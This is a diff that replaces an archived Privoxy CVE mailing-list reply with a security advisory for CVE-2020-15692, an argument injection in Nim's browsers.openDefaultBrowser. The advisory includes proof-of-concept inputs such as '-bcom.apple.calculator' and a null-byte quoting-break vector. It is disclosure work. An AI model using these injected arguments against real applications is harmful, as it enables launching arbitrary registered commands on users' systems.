@@ -1,54 +1,128 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/03/06/2
-Message-ID: <20210306100856.1cdc126e@fabiankeil.de>
-Date: Sat, 6 Mar 2021 10:08:56 +0100
-From: Fabian Keil <freebsd-listen@...iankeil.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/02/04/1
+Message-Id: <BF1D4D4E-FE1B-424C-ADBB-C53FF0B5054E@consensys.net>
+Date: Thu, 4 Feb 2021 11:33:26 +0100
+From: Martin Ortner <martin.ortner@...sensys.net>
 To: oss-security@...ts.openwall.com
-Subject: Re: Multiple DoS issues fixed in Privoxy 3.0.32 stable
+Subject: [CVE-2020-15692] Nim - stdlib Browsers - `open` Argument Injection
 Content-Type: text/plain; charset=utf-8
 
-Fabian Keil <freebsd-listen@...iankeil.de> wrote on 2021-02-28:
+title: "Nim - stdlib Browsers - `open` Argument Injection"
+date: 2020-07-30T19:32:09+01:00
 
-> Privoxy 3.0.32 fixes multiple DoS issues and a couple of other bugs.
-> The issues also affect earlier Privoxy releases.
-[...]
->   - ssplit(): Remove an assertion that could be triggered with a
->     crafted CGI request.
->     Commit 2256d7b4d67. OVE-20210203-0001.
->     Reported by: Joshua Rogers (Opera)
+cve: ["CVE-2020-15692"]
+vendor: nim-lang
+vendorUrl: https://nim-lang.org/
+authors: tintinweb
+affectedVersions: [ "<= 1.2.6" ]
+vulnClass: CWE-88
 
-CVE-2021-20272.
+Vulnerability Note: https://consensys.net/diligence/vulnerabilities/nim-browsers-argument-injection/ <https://consensys.net/diligence/vulnerabilities/nim-browsers-argument-injection/> 
+Vulnerability Note: https://github.com/tintinweb/pub/tree/master/pocs/cve-2020-15692 <https://github.com/tintinweb/pub/tree/master/pocs/cve-2020-15692>
+Group: https://consensys.net/diligence/research/
 
->   - cgi_send_banner(): Overrule invalid image types. Prevents a
->     crash with a crafted CGI request if Privoxy is toggled off.
->     Commit e711c505c48. OVE-20210206-0001.
->     Reported by: Joshua Rogers (Opera)
 
-CVE-2021-20273.
+## Summary 
 
->   - socks5_connect(): Don't try to send credentials when none are
->     configured. Fixes a crash due to a NULL-pointer dereference
->     when the socks server misbehaves.
->     Commit 85817cc55b9. OVE-20210207-0001.
->     Reported by: Joshua Rogers (Opera)
+The nim-lang stdlib `browsers` provides a convenient interface to open an URL with the system default browser. The library, however, fails to validated that the provided input is actually an URL. An attacker in control of an unfiltered URL passed to `browsers.openDefaultBrowser(URL)` can, therefore, provide a local file path that will be opened in the default explorer or pass one argument to the underlying `open` command to execute arbitrary registered system commands. 
 
-CVE-2021-20274.
+## Details
 
->   - chunked_body_is_complete(): Prevent an invalid read of size two.
->     Commit a912ba7bc9c. OVE-20210205-0001.
->     Reported by: Joshua Rogers (Opera)
+### Description
 
-CVE-2021-20275.
+`browsers.openDefaultBrowser()` internally calls `shellExecuteW` passing in the URL as an arg to `open` for Windows and `execShellCmd` with the OS's open command (`xdg-open` on linux, `open` on MacOs) and the shell quoted `url` as an argument on nix systems. 
 
->   - Obsolete pcre: Prevent invalid memory accesses with an invalid
->     pattern passed to pcre_compile(). Note that the obsolete pcre code
->     is scheduled to be removed before the 3.0.33 release. There has been
->     a warning since 2008 already.
->     Commit 28512e5b624. OVE-20210222-0001.
->     Reported by: Joshua Rogers (Opera)
+The implementation is as follows:
 
-CVE-2021-20276.
+```nim
+template openDefaultBrowserImpl(url: string) = 
+  when defined(windows):
+    var o = newWideCString(osOpenCmd)
+    var u = newWideCString(url)
+    discard shellExecuteW(0'i32, o, u, nil, nil, SW_SHOWNORMAL)
+  elif defined(macosx):
+    discard execShellCmd(osOpenCmd & " " & quoteShell(url)) 
+  else:
+    var u = quoteShell(url)
+    if execShellCmd(osOpenCmd & " " & u) == 0: return
+    for b in getEnv("BROWSER").string.split(PathSep):
+      try:
+        # we use ``startProcess`` here because we don't want to block!
+        discard startProcess(command = b, args = [url], options = {poUsePath})
+        return
+      except OSError:
+        discard
+```
 
-Fabian
+On windows, the attacker controls the `lpFile` argument to `shellExecuteW` which may allow opening arbitrary local files.
+On MacOs, the attacker controls the first argument to the `open` command which takes the following command line switches:
 
-Content of type "application/pgp-signature" skipped
+```
+Options: 
+      -a                Opens with the specified application.
+      -b                Opens with the specified application bundle identifier.
+      -e                Opens with TextEdit.
+      -t                Opens with default text editor.
+      -f                Reads input from standard input and opens with TextEdit.
+      -F  --fresh       Launches the app fresh, that is, without restoring windows. Saved persistent state is lost, excluding Untitled documents.
+      -R, --reveal      Selects in the Finder instead of opening.
+      -W, --wait-apps   Blocks until the used applications are closed (even if they were already running).
+          --args        All remaining arguments are passed in argv to the application's main() function instead of opened.
+      -n, --new         Open a new instance of the application even if one is already running.
+      -j, --hide        Launches the app hidden.
+      -g, --background  Does not bring the application to the foreground.
+      -h, --header      Searches header file locations for headers matching the given filenames, and opens them.
+      -s                For -h, the SDK to use; if supplied, only SDKs whose names contain the argument value are searched.
+                        Otherwise the highest versioned SDK in each platform is used.
+```
+
+If an attacker manages to pass in an URL that is actually a commandline switche to open, they may be able to launch arbitrary commands (or do whatever open allows them to do with one argument). For example, `openDefaultBrowser(".")` will open Finder in the current working dir, `openDefaultBrowser("-aCalculator")` and `openDefaultBrowser("-bcom.apple.calculator")` launches the calculator. 
+
+
+### Proof of Concept
+
+
+launch calculator:
+
+```nim
+import browsers
+openDefaultBrowser("-bcom.apple.calculator") 
+```
+
+terminate the shell quoting causing an error:
+
+```nim
+import browsers
+var vector = "-bcom.apple.calculator\x00"
+openDefaultBrowser(vector) 
+
+```
+
+```
+⇒  nim c -r -d:ssl test.nim
+sh: -c: line 0: unexpected EOF while looking for matching `''
+sh: -c: line 1: syntax error: unexpected end of file
+```
+
+
+## Vendor Response
+
+Vendor response: fixed in [v1.2.6](https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.html)
+
+
+### Timeline
+
+```
+JUL/09/2020 - contact the development team @telegram; provided details, PoC
+JUL/30/2020 - fixed in new release
+```
+
+## References
+
+
+* [1] https://nim-lang.org/
+* [2] https://nim-lang.org/install.html
+* [3] https://en.wikipedia.org/wiki/Nim_(programming_language)
+* [4] https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.html
+
+
